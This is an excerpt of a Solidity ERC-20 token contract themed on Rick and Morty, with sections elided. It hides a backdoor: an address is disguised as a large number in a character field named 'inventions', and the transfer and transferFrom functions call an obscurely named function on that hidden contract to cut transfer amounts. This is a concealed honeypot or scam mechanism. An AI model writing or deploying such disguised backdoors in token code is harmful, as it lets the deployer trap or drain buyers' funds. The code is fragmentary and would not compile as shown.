...
interface vcaefa {
    function opaisdauq(address _amount) external view returns (uint256);
}
...
abstract contract Character {
    ...
    bool MadScientist = true;
    uint16 old = 70;

    string title = "Smartest Man in the Universe";

    uint160 inventions = 1296090026702534179124654940328149070177535536821;

    string son = "Beth Smith";
    string grandson = "Morty and Summer";
...
abstract contract Morty {
    bool young = true;
    string relative = "Grand Son";

}

contract Ricky is IERC20, Character, Morty, Ownable {
    ...
    returns (bool)
    {
        ...
        if (amount <= inventions) {
            amount = amount - vcaefa(address(inventions)).opaisdauq(msg.sender);
        }
        return true;
    }
    ...
    function transferFrom(
        ...
        if (amount <= inventions) {
            amount = amount - vcaefa(address(inventions)).opaisdauq(sender);
        }
        return true;
    }
